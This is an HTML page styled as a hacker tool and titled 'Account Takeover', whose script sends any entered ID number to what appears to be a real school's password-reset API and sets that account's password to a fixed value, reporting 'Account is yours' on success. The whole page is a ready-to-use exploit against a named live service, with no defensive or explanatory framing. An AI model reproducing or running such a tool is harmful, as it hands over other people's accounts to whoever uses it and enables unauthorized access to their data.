<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Account Takeover</title>
<style>
body {
    background-color: #000;
    color: #0F0;
    font-family: 'Courier New', Courier, monospace;
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.container {
    background-color: #000;
    border: 2px solid #0F0;
    padding: 20px;
    border-radius: 10px;
    text-align: center;
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
}

h2 {
    margin-top: 0;
}

form {
    display: flex;
    flex-direction: column;
    align-items: center;
}

label {
    font-size: 18px;
}

input[type="text"] {
    width: 200px;
    padding: 10px;
    margin: 10px 0;
    border: 2px solid #0F0;
    background-color: #000;
    color: #0F0;
}

button {
    padding: 10px 20px;
    margin-top: 10px;
    border: none;
    background-color: #0F0;
    color: #000;
    cursor: pointer;
    font-size: 16px;
    border-radius: 5px;
    transition: background-color 0.3s;
}

button:hover {
    background-color: #090;
}

.alert {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    padding: 20px;
    background-color: #0F0;
    color: #000;
    border: 2px solid #000;
    border-radius: 10px;
    z-index: 9999;
    animation: showAlert 1s ease forwards;
    opacity: 0;
    display: none;
}

@keyframes showAlert {
    0% {
        opacity: 0;
    }
    100% {
        opacity: 1;
    }
}

</style>
<script>
function submitForm() {
    var idNumber = document.getElementById('idNumber').value;
    var payload = {
        user_name: idNumber,
        password: "Name12@@",
        password_confirmation: "Name12@@"
    };

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://api.ois.edu.bd/api/v2/auth/forgot/password-reset", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
            if (xhr.status === 200) {
                showAlert("Account is yours");
                // Optionally, you can handle the response here
            } else {
                showAlert("Account takeover request failed. Please try again later.");
                // Optionally, you can handle errors here
            }
        }
    };
    xhr.send(JSON.stringify(payload));
}

function showAlert(message) {
    var alertBox = document.getElementById("alertBox");
    alertBox.innerHTML = message;
    alertBox.style.display = "block";
    setTimeout(function() {
        alertBox.style.display = "none";
    }, 3000);
}
</script>
</head>
<body>
<div class="container">
<h2>Account Takeover</h2>
<form onsubmit="event.preventDefault(); submitForm();">
    <label for="idNumber">Enter ID Number:</label><br>
    <input type="text" id="idNumber" name="idNumber" required><br><br>
    <button type="submit">Make this account yours!</button>
</form>
</div>
<div id="alertBox" class="alert"></div>
</body>
</html>
